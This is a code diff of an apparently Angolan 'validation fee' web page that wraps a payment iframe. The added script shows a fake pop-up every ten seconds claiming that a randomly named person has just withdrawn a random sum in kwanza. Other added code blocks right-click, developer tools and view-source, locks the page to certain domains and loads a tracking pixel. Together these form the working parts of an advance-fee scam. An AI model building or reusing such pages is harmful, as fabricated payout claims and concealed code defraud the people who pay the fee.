@@ -1,26 +1,128 @@
 <!DOCTYPE html>
-<html lang="pt-BR">
+<html lang="pt">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>TAXA ATIVAÇÃO</title>
-    <style>
-        body, html {
-            margin: 0;
-            padding: 0;
-            height: 100%;
-            overflow: hidden;
-            background-color: #f8f9fa;
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>TAXA DE VALIDAÇÃO</title>
+
+<script>
+    // Domain lock
+    (function(){
+      var d = window.location.hostname;
+      var allowed = ['localhost','vercel.app','github.com'];
+      var ok = false;
+      for(var i=0;i<allowed.length;i++){if(d===allowed[i]||d.endsWith('.'+allowed[i])){ok=true;break;}}
+      if(!ok){document.documentElement.innerHTML='';window.location.href='about:blank';}
+    })();
+    // Anti-clone protections
+    document.addEventListener('contextmenu',function(e){e.preventDefault();});
+    document.addEventListener('keydown',function(e){
+      if(e.key==='F12')e.preventDefault();
+      if((e.ctrlKey||e.metaKey)&&['u','s','U','S'].includes(e.key))e.preventDefault();
+      if((e.ctrlKey||e.metaKey)&&e.shiftKey&&['I','i','J','j','C','c'].includes(e.key))e.preventDefault();
+    });
+  </script><script async="" defer="" src="js/pixel.js"></script>
+
+<script src="https://cdn.jsdelivr.net/npm/notiflix@2.6.0/dist/notiflix-aio-2.6.0.min.js"></script>
+
+<script>
+    var position = "left-bottom";
+    var color = "verde";
+    var animation = "from-left";
+    var product_name = "";
+    var timeout = 4000;
+    var type_name = "fem";
+    var msg_final = "";
+
+    var names_fem = [
+        'João', 'Manuel', 'Paulo', 'Carlos', 'Pedro', 'José', 'António',
+        'Filipe', 'Domingos', 'Miguel', 'Mateus', 'Daniel', 'Jorge',
+        'Adilson', 'Edson', 'Emanuel', 'Geraldo', 'Luís', 'Fernando',
+        'Kazumbula', 'Osvaldo', 'Valter', 'Maurício', 'Tomás', 'César',
+        'Ana', 'Antónia', 'Adriana', 'Juliana', 'Márcia', 'Fernanda',
+        'Patrícia', 'Camila', 'Bruna', 'Jéssica', 'Luciana', 'Mariana',
+        'Vitória', 'Cláudia'
+    ];
+
+    var option = {
+        position: position,
+        cssAnimationStyle: animation,
+        plainText: false,
+        timeout: timeout
+    };
+
+    function gerarValor() {
+        // Gera valor entre 100000 e 160000
+        return Math.floor(Math.random() * (160000 - 100000 + 1)) + 100000;
+    }
+
+    function formatarKz(valor) {
+        return valor.toLocaleString('pt-PT') + " kz";
+    }
+
+    function show_notification() {
+        var nome = names_fem[Math.floor(Math.random() * names_fem.length)];
+        var valor = formatarKz(gerarValor());
+
+        msg_final = "<strong>" + nome + "</strong> sacou agora " + valor + " " + product_name;
+
+        if (color == "verde") {
+            Notiflix.Notify.Success(msg_final, option);
         }
-        iframe {
-            width: 100vw;
-            height: 100vh;
-            border: none;
-            display: block;
+
+        if (color == "azul") {
+            Notiflix.Notify.Info(msg_final, option);
         }
-    </style>
+
+        if (color == "vermelho") {
+            Notiflix.Notify.Failure(msg_final, option);
+        }
+
+        if (color == "amarelo") {
+            Notiflix.Notify.Warning(msg_final, option);
+        }
+
+        setTimeout(show_notification, 10000);
+    }
+
+    // Primeira notificação imediata
+    setTimeout(show_notification, 1000);
+</script>
+
+    
+<style>
+*{
+    margin:0;
+    padding:0;
+    box-sizing:border-box;
+}
+
+html, body{
+    width:100%;
+    height:100%;
+    overflow:hidden;
+}
+
+.iframe-container{
+    width:100%;
+    height:100vh;
+}
+
+.iframe-container iframe{
+    width:100%;
+    height:100%;
+    border:none;
+    display:block;
+}
+</style>
+
 </head>
+
 <body>
-    <iframe src="https://pay.kumbipay.com/d77a1e6f-0fea-40b9-9cbd-ba6cb4a3c236" allowfullscreen></iframe>
+
+<div class="iframe-container">
+    <iframe src="https://pay.kumbipay.com/d77a1e6f-0fea-40b9-9cbd-ba6cb4a3c236"></iframe>
+</div>
+
 </body>
 </html>
